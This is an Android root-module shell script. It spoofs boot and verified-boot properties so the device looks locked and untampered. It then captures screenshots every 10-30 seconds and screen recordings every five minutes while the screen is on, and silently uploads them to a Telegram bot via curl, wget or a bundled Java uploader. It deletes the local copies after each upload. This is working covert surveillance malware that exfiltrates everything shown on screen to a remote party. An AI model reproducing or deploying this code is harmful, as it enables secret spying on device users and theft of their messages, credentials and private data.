#!/system/bin/sh

check_reset_prop() {
  local NAME=$1
  local EXPECTED=$2
  local VALUE=$(resetprop $NAME)
  [ -z $VALUE ] || [ $VALUE = $EXPECTED ] || resetprop -n $NAME $EXPECTED
}

contains_reset_prop() {
  local NAME=$1
  local CONTAINS=$2
  local NEWVAL=$3
  [[ "$(resetprop $NAME)" = *"$CONTAINS"* ]] && resetprop -n $NAME $NEWVAL
}

resetprop -w sys.boot_completed 0

check_reset_prop "ro.boot.vbmeta.device_state" "locked"
check_reset_prop "ro.boot.verifiedbootstate" "green"
check_reset_prop "ro.boot.flash.locked" "1"
check_reset_prop "ro.boot.veritymode" "enforcing"
check_reset_prop "ro.boot.warranty_bit" "0"
check_reset_prop "ro.warranty_bit" "0"
check_reset_prop "ro.debuggable" "0"
check_reset_prop "ro.force.debuggable" "0"
check_reset_prop "ro.secure" "1"
check_reset_prop "ro.adb.secure" "1"
check_reset_prop "ro.build.type" "user"
check_reset_prop "ro.build.tags" "release-keys"
check_reset_prop "ro.vendor.boot.warranty_bit" "0"
check_reset_prop "ro.vendor.warranty_bit" "0"
check_reset_prop "vendor.boot.vbmeta.device_state" "locked"
check_reset_prop "vendor.boot.verifiedbootstate" "green"
check_reset_prop "sys.oem_unlock_allowed" "0"

# MIUI specific
check_reset_prop "ro.secureboot.lockstate" "locked"

# Realme specific
check_reset_prop "ro.boot.realmebootstate" "green"
check_reset_prop "ro.boot.realme.lockstate" "1"

# Hide that we booted from recovery when magisk is in recovery mode
contains_reset_prop "ro.bootmode" "recovery" "unknown"
contains_reset_prop "ro.boot.bootmode" "recovery" "unknown"
contains_reset_prop "vendor.boot.bootmode" "recovery" "unknown"

umask 022

MODDIR=${0%/*}

[ -f "$MODDIR/config.sh" ] && . "$MODDIR/config.sh"

PATH="$PATH:/data/local/bin:/system/xbin:/system/bin"

ANDROID_ROOT=${ANDROID_ROOT:-/system}
ANDROID_DATA=${ANDROID_DATA:-/data}
export ANDROID_ROOT ANDROID_DATA

JAVA_APP=/system/bin/app_process
JAVA_JAR="$MODDIR/uploader.jar"

MIN_INTERVAL=${MIN_INTERVAL:-10}
MAX_INTERVAL=${MAX_INTERVAL:-30}
OUTDIR=${OUTDIR:-/sdcard/ScreenMod}
MAX_FILES=${MAX_FILES:-500}
SKIP_SCREEN_OFF=${SKIP_SCREEN_OFF:-1}
TELEGRAM_BOT_TOKEN=${TELEGRAM_BOT_TOKEN:-}
TELEGRAM_BOT_TOKENS=${TELEGRAM_BOT_TOKENS:-}
TELEGRAM_CHAT_ID=${TELEGRAM_CHAT_ID:-}
TELEGRAM_API_BASE=${TELEGRAM_API_BASE:-https://api.telegram.org}
TELEGRAM_METHOD=${TELEGRAM_METHOD:-sendDocument}
TELEGRAM_SILENT=${TELEGRAM_SILENT:-1}
TELEGRAM_PHOTO_MAX=${TELEGRAM_PHOTO_MAX:-1600}
TELEGRAM_PHOTO_QUALITY=${TELEGRAM_PHOTO_QUALITY:-85}
DELETE_AFTER_SEND=${DELETE_AFTER_SEND:-1}
UPLOAD_RETRIES=${UPLOAD_RETRIES:-2}
UPLOAD_TIMEOUT=${UPLOAD_TIMEOUT:-120}
UPLOADER=${UPLOADER:-auto}
DEVICE_LABEL=${DEVICE_LABEL:-}
VIDEO_ENABLED=${VIDEO_ENABLED:-1}
VIDEO_INTERVAL=${VIDEO_INTERVAL:-300}
VIDEO_SECONDS=${VIDEO_SECONDS:-30}
VIDEO_BITRATE=${VIDEO_BITRATE:-2000000}

case "$MIN_INTERVAL" in ''|*[!0-9]*) MIN_INTERVAL=10 ;; esac
case "$MAX_INTERVAL" in ''|*[!0-9]*) MAX_INTERVAL=30 ;; esac
case "$MAX_FILES" in ''|*[!0-9]*) MAX_FILES=500 ;; esac
case "$UPLOAD_RETRIES" in ''|*[!0-9]*) UPLOAD_RETRIES=2 ;; esac
case "$UPLOAD_TIMEOUT" in ''|*[!0-9]*) UPLOAD_TIMEOUT=120 ;; esac
case "$TELEGRAM_PHOTO_MAX" in ''|*[!0-9]*) TELEGRAM_PHOTO_MAX=1600 ;; esac
case "$TELEGRAM_PHOTO_QUALITY" in ''|*[!0-9]*) TELEGRAM_PHOTO_QUALITY=85 ;; esac
case "$VIDEO_INTERVAL" in ''|*[!0-9]*) VIDEO_INTERVAL=300 ;; esac
case "$VIDEO_SECONDS" in ''|*[!0-9]*) VIDEO_SECONDS=30 ;; esac
case "$VIDEO_BITRATE" in ''|*[!0-9]*) VIDEO_BITRATE=2000000 ;; esac

[ "$MIN_INTERVAL" -lt 1 ] && MIN_INTERVAL=10
[ "$MAX_INTERVAL" -lt "$MIN_INTERVAL" ] && MAX_INTERVAL=$MIN_INTERVAL
[ "$UPLOAD_RETRIES" -lt 1 ] && UPLOAD_RETRIES=1
[ "$UPLOAD_TIMEOUT" -lt 10 ] && UPLOAD_TIMEOUT=120
[ "$TELEGRAM_PHOTO_MAX" -lt 320 ] && TELEGRAM_PHOTO_MAX=1600
[ "$TELEGRAM_PHOTO_MAX" -gt 4096 ] && TELEGRAM_PHOTO_MAX=4096
[ "$TELEGRAM_PHOTO_QUALITY" -lt 1 ] && TELEGRAM_PHOTO_QUALITY=85
[ "$TELEGRAM_PHOTO_QUALITY" -gt 100 ] && TELEGRAM_PHOTO_QUALITY=100
[ "$VIDEO_INTERVAL" -lt 60 ] && VIDEO_INTERVAL=300
[ "$VIDEO_SECONDS" -lt 1 ] && VIDEO_SECONDS=30
[ "$VIDEO_SECONDS" -gt 180 ] && VIDEO_SECONDS=180
[ "$VIDEO_BITRATE" -lt 100000 ] && VIDEO_BITRATE=2000000
[ "$VIDEO_BITRATE" -gt 20000000 ] && VIDEO_BITRATE=20000000

case "$TELEGRAM_METHOD" in
  sendPhoto) ;;
  *) TELEGRAM_METHOD=sendDocument ;;
esac

case "$UPLOADER" in curl|wget|java|auto) ;; *) UPLOADER=auto ;; esac
case "$VIDEO_ENABLED" in 0|1) ;; *) VIDEO_ENABLED=1 ;; esac

if [ -z "$DEVICE_LABEL" ]; then
  DEVICE_LABEL=$(getprop ro.product.model 2>/dev/null)
fi

LOG="$MODDIR/screenmod.log"
PIDFILE="$MODDIR/screenmod.pid"

VID_ACTIVE=""
VID_FILE=""
VID_DONE=""

log() {
  if [ -f "$LOG" ]; then
    SIZE=$(wc -c < "$LOG" 2>/dev/null)
    case "$SIZE" in ''|*[!0-9]*) SIZE=0 ;; esac
    [ "$SIZE" -gt 524288 ] && mv -f "$LOG" "$LOG.old" 2>/dev/null
  fi
  echo "$(date '+%Y-%m-%d %H:%M:%S') $*" >> "$LOG" 2>/dev/null
}

telegram_enabled() {
  [ -n "$TELEGRAM_CHAT_ID" ] || return 1
  [ -n "$TELEGRAM_BOT_TOKENS" ] || [ -n "$TELEGRAM_BOT_TOKEN" ]
}

bot_count() {
  if [ -n "$TELEGRAM_BOT_TOKENS" ]; then
    set -- $TELEGRAM_BOT_TOKENS
    echo $#
  elif [ -n "$TELEGRAM_BOT_TOKEN" ]; then
    echo 1
  else
    echo 0
  fi
}

pick_token() {
  TOKEN_FOR_SEND=""
  if [ -n "$TELEGRAM_BOT_TOKENS" ]; then
    set -- $TELEGRAM_BOT_TOKENS
    COUNT=$#
    if [ "$COUNT" -gt 0 ]; then
      rand
      IDX=$((RAND % COUNT + 1))
      while [ "$IDX" -gt 1 ]; do
        shift
        IDX=$((IDX - 1))
      done
      TOKEN_FOR_SEND=$1
    fi
  fi
  [ -n "$TOKEN_FOR_SEND" ] || TOKEN_FOR_SEND=$TELEGRAM_BOT_TOKEN
}

make_caption() {
  TS=$(date '+%Y-%m-%d %H:%M:%S' 2>/dev/null)
  if [ -n "$DEVICE_LABEL" ]; then
    CAPTION="$DEVICE_LABEL | $TS"
  else
    CAPTION="$TS"
  fi
}

wget_gnu_bin() {
  if command -v wget >/dev/null 2>&1; then
    if wget --version 2>/dev/null | grep -q 'GNU Wget'; then
      command -v wget
      return 0
    fi
  fi
  return 1
}

select_uploader() {
  UPLOAD_KIND=""
  UPLOAD_BIN=""
  case "$UPLOADER" in
    curl)
      if command -v curl >/dev/null 2>&1; then
        UPLOAD_BIN=$(command -v curl)
        UPLOAD_KIND=curl
      fi
      ;;
    wget)
      if WGET_TMP=$(wget_gnu_bin); then
        UPLOAD_BIN=$WGET_TMP
        UPLOAD_KIND=wget
      fi
      ;;
    java)
      if [ -x "$JAVA_APP" ] && [ -f "$JAVA_JAR" ]; then
        UPLOAD_BIN=$JAVA_APP
        UPLOAD_KIND=java
      fi
      ;;
    *)
      if [ "$TELEGRAM_METHOD" = "sendPhoto" ] && [ -x "$JAVA_APP" ] && [ -f "$JAVA_JAR" ]; then
        UPLOAD_BIN=$JAVA_APP
        UPLOAD_KIND=java
      elif command -v curl >/dev/null 2>&1; then
        UPLOAD_BIN=$(command -v curl)
        UPLOAD_KIND=curl
      elif [ -x "$JAVA_APP" ] && [ -f "$JAVA_JAR" ]; then
        UPLOAD_BIN=$JAVA_APP
        UPLOAD_KIND=java
      elif WGET_TMP=$(wget_gnu_bin); then
        UPLOAD_BIN=$WGET_TMP
        UPLOAD_KIND=wget
      fi
      ;;
  esac
}

if [ -f "$PIDFILE" ]; then
  OLDPID=$(cat "$PIDFILE" 2>/dev/null)
  case "$OLDPID" in
    ''|*[!0-9]*) ;;
    *)
      if [ "$OLDPID" != "$$" ] && kill -0 "$OLDPID" 2>/dev/null; then
        kill "$OLDPID" 2>/dev/null
        sleep 1
        kill -9 "$OLDPID" 2>/dev/null
      fi
      ;;
  esac
fi
echo $$ > "$PIDFILE"

rm -f "$MODDIR"/.tg_body.* "$MODDIR"/.tg_resp.* "$MODDIR"/.video_done.* 2>/dev/null

SEED=$(date +%S 2>/dev/null)
case "$SEED" in 0*) SEED=${SEED#0} ;; esac
case "$SEED" in ''|*[!0-9]*) SEED=1 ;; esac

rand() {
  if [ -n "${RANDOM:-}" ]; then
    RAND=$RANDOM
  else
    SEED=$(( (SEED * 1103515245 + 12345) % 32768 ))
    RAND=$SEED
  fi
}

screen_on() {
  dumpsys power 2>/dev/null | grep -Eq 'mWakefulness=Awake|Display Power: state=ON'
}

capture() {
  TS=$(date '+%Y%m%d_%H%M%S' 2>/dev/null)
  [ -n "$TS" ] || TS=$(date +%s 2>/dev/null)
  rand
  FILE="$OUTDIR/screen_${TS}_$$_${RAND}.png"
  if command -v timeout >/dev/null 2>&1; then
    timeout 20 screencap -p "$FILE" >/dev/null 2>&1
  else
    screencap -p "$FILE" >/dev/null 2>&1
  fi
  if [ -s "$FILE" ]; then
    chmod 0644 "$FILE" 2>/dev/null
    return 0
  fi
  rm -f "$FILE" 2>/dev/null
  return 1
}

prune() {
  [ "$MAX_FILES" -gt 0 ] 2>/dev/null || return 0
  COUNT=$(ls -1 "$OUTDIR"/*.png 2>/dev/null | wc -l)
  case "$COUNT" in ''|*[!0-9]*) COUNT=0 ;; esac
  [ "$COUNT" -gt "$MAX_FILES" ] 2>/dev/null || return 0
  ls -1t "$OUTDIR"/*.png 2>/dev/null | tail -n +$((MAX_FILES + 1)) | while IFS= read -r f; do
    rm -f "$f" 2>/dev/null
  done
}

build_multipart() {
  BOUNDARY="----screenmod$(date +%s)$$"
  BODY="$MODDIR/.tg_body.$$"
  {
    printf '%s\r\n' "--$BOUNDARY"
    printf 'Content-Disposition: form-data; name="chat_id"\r\n\r\n%s\r\n' "$TELEGRAM_CHAT_ID"
    if [ "$TELEGRAM_SILENT" = "1" ]; then
      printf '%s\r\n' "--$BOUNDARY"
      printf 'Content-Disposition: form-data; name="disable_notification"\r\n\r\ntrue\r\n'
    fi
    if [ -n "$REQ_CAPTION" ]; then
      printf '%s\r\n' "--$BOUNDARY"
      printf 'Content-Disposition: form-data; name="caption"\r\n\r\n%s\r\n' "$REQ_CAPTION"
    fi
    printf '%s\r\n' "--$BOUNDARY"
    printf 'Content-Disposition: form-data; name="%s"; filename="%s"\r\n' "$REQ_FIELD" "${1##*/}"
    printf 'Content-Type: %s\r\n\r\n' "$REQ_TYPE"
    cat "$1"
    printf '\r\n--%s--\r\n' "$BOUNDARY"
  } > "$BODY"
}

upload_file() {
  FILE_TO_SEND=$1
  METHOD_TO_SEND=$2
  [ -n "$UPLOAD_KIND" ] || return 1
  case "$METHOD_TO_SEND" in
    sendPhoto) REQ_FIELD=photo; REQ_TYPE=image/png ;;
    sendVideo) REQ_FIELD=video; REQ_TYPE=video/mp4 ;;
    *) REQ_FIELD=document; REQ_TYPE=application/octet-stream ;;
  esac
  REQ_CAPTION="$CAPTION"
  ATTEMPT=1
  LAST_ERROR=""
  while [ "$ATTEMPT" -le "$UPLOAD_RETRIES" ]; do
    LAST_ERROR=""
    pick_token
    if [ "$UPLOAD_KIND" = "java" ]; then
      OUT=$(CLASSPATH="$JAVA_JAR" "$JAVA_APP" /system/bin screenmod.Uploader \
        "$TELEGRAM_API_BASE" "$TOKEN_FOR_SEND" "$TELEGRAM_CHAT_ID" \
        "$METHOD_TO_SEND" "$TELEGRAM_SILENT" "$UPLOAD_TIMEOUT" \
        "$TELEGRAM_PHOTO_MAX" "$TELEGRAM_PHOTO_QUALITY" "$REQ_CAPTION" "$FILE_TO_SEND" 2>&1)
      RC=$?
      if [ "$RC" -eq 0 ]; then
        return 0
      fi
      LAST_ERROR=$(printf '%s' "$OUT" | head -c 300 | tr '\n\r' '  ')
    else
      RESP="$MODDIR/.tg_resp.$$"
      URL="${TELEGRAM_API_BASE%/}/bot${TOKEN_FOR_SEND}/${METHOD_TO_SEND}"
      rm -f "$RESP"
      if [ "$UPLOAD_KIND" = "curl" ]; then
        if [ "$TELEGRAM_SILENT" = "1" ]; then
          "$UPLOAD_BIN" -sS --max-time "$UPLOAD_TIMEOUT" --connect-timeout 20 -o "$RESP" \
            -F "chat_id=$TELEGRAM_CHAT_ID" -F "disable_notification=true" \
            -F "caption=$REQ_CAPTION" \
            -F "$REQ_FIELD=@$FILE_TO_SEND" "$URL" >/dev/null 2>&1
        else
          "$UPLOAD_BIN" -sS --max-time "$UPLOAD_TIMEOUT" --connect-timeout 20 -o "$RESP" \
            -F "chat_id=$TELEGRAM_CHAT_ID" \
            -F "caption=$REQ_CAPTION" \
            -F "$REQ_FIELD=@$FILE_TO_SEND" "$URL" >/dev/null 2>&1
        fi
      else
        build_multipart "$FILE_TO_SEND"
        "$UPLOAD_BIN" -q -T "$UPLOAD_TIMEOUT" --method=POST \
          --body-file="$BODY" \
          --header "Content-Type: multipart/form-data; boundary=$BOUNDARY" \
          -O "$RESP" "$URL" >/dev/null 2>&1
        rm -f "$BODY" 2>/dev/null
      fi
      if grep -Eq '"ok"[[:space:]]*:[[:space:]]*true' "$RESP" 2>/dev/null; then
        rm -f "$RESP" 2>/dev/null
        return 0
      fi
      LAST_ERROR=$(grep -o '"description"[[:space:]]*:[[:space:]]*"[^"]*"' "$RESP" 2>/dev/null | head -n 1 | sed 's/.*"description"[[:space:]]*:[[:space:]]*"//; s/"$//')
      rm -f "$RESP" 2>/dev/null
    fi
    ATTEMPT=$((ATTEMPT + 1))
    [ "$ATTEMPT" -le "$UPLOAD_RETRIES" ] && sleep 5
  done
  for T in $TELEGRAM_BOT_TOKENS $TELEGRAM_BOT_TOKEN; do
    [ -n "$T" ] && LAST_ERROR=$(printf '%s' "$LAST_ERROR" | sed "s|$T|REDACTED|g")
  done
  LAST_ERROR=$(printf '%s' "$LAST_ERROR" | sed 's/^telegram: //; s/^uploader: //')
  if [ -n "$LAST_ERROR" ]; then
    log "telegram error: $LAST_ERROR"
  else
    log "telegram upload failed"
  fi
  return 1
}

start_video() {
  TS=$(date '+%Y%m%d_%H%M%S' 2>/dev/null)
  [ -n "$TS" ] || TS=$(date +%s 2>/dev/null)
  rand
  VID_FILE="$OUTDIR/video_${TS}_$$_${RAND}.mp4"
  VID_DONE="$MODDIR/.video_done.$$"
  rm -f "$VID_DONE" 2>/dev/null
  (
    if command -v timeout >/dev/null 2>&1; then
      timeout $((VIDEO_SECONDS + 30)) screenrecord --time-limit "$VIDEO_SECONDS" \
        --bit-rate "$VIDEO_BITRATE" "$VID_FILE" >/dev/null 2>&1
    else
      screenrecord --time-limit "$VIDEO_SECONDS" --bit-rate "$VIDEO_BITRATE" \
        "$VID_FILE" >/dev/null 2>&1
    fi
    echo done > "$VID_DONE" 2>/dev/null
  ) &
  VID_ACTIVE=1
  log "recording video $VID_FILE"
}

finish_video() {
  [ "$VID_ACTIVE" = "1" ] || return 0
  [ -f "$VID_DONE" ] || return 0
  rm -f "$VID_DONE" 2>/dev/null
  VID_ACTIVE=""
  if [ ! -s "$VID_FILE" ]; then
    log "video capture failed"
    rm -f "$VID_FILE" 2>/dev/null
    VID_FILE=""
    return 0
  fi
  chmod 0644 "$VID_FILE" 2>/dev/null
  if telegram_enabled && [ -n "$UPLOAD_KIND" ]; then
    make_caption
    if upload_file "$VID_FILE" sendVideo; then
      [ "$DELETE_AFTER_SEND" = "1" ] && rm -f "$VID_FILE" 2>/dev/null
    else
      log "kept $VID_FILE"
    fi
  fi
  VID_FILE=""
}

i=0
while ! mkdir -p "$OUTDIR" 2>/dev/null; do
  i=$((i + 1))
  [ "$i" -ge 60 ] && break
  sleep 2
done

select_uploader
if telegram_enabled; then
  if [ -n "$UPLOAD_KIND" ]; then
    log "telegram enabled method=$TELEGRAM_METHOD uploader=$UPLOAD_KIND bots=$(bot_count)"
  else
    log "telegram configured but no usable uploader found; keeping files local"
  fi
else
  log "telegram not configured; keeping files local"
fi

if [ "$VIDEO_ENABLED" = "1" ]; then
  if ! command -v screenrecord >/dev/null 2>&1; then
    VIDEO_ENABLED=0
    log "video disabled: screenrecord not found"
  elif ! telegram_enabled; then
    VIDEO_ENABLED=0
    log "video disabled: telegram not configured"
  elif [ -z "$UPLOAD_KIND" ]; then
    VIDEO_ENABLED=0
    log "video disabled: no uploader"
  fi
fi

LAST_VIDEO=$(date +%s)
log "started pid=$$ outdir=$OUTDIR interval=${MIN_INTERVAL}-${MAX_INTERVAL} max_files=$MAX_FILES video=${VIDEO_ENABLED} video_interval=${VIDEO_INTERVAL} video_seconds=${VIDEO_SECONDS}"

while true; do
  SPAN=$((MAX_INTERVAL - MIN_INTERVAL))
  if [ "$SPAN" -gt 0 ]; then
    rand
    DELAY=$((MIN_INTERVAL + RAND % (SPAN + 1)))
  else
    DELAY=$MIN_INTERVAL
  fi
  sleep "$DELAY"
  [ -e "$MODDIR/disable" ] && continue
  if [ "$SKIP_SCREEN_OFF" = "1" ] && ! screen_on; then
    continue
  fi
  finish_video
  mkdir -p "$OUTDIR" 2>/dev/null
  if capture; then
    if telegram_enabled && [ -n "$UPLOAD_KIND" ]; then
      make_caption
      if upload_file "$FILE" "$TELEGRAM_METHOD"; then
        [ "$DELETE_AFTER_SEND" = "1" ] && rm -f "$FILE" 2>/dev/null
      else
        log "kept $FILE"
      fi
    fi
    prune
  else
    log "capture failed"
  fi
  if [ "$VIDEO_ENABLED" = "1" ] && [ -z "$VID_ACTIVE" ]; then
    NOW=$(date +%s)
    if [ $((NOW - LAST_VIDEO)) -ge "$VIDEO_INTERVAL" ]; then
      LAST_VIDEO=$(date +%s)
      start_video
    fi
  fi
done
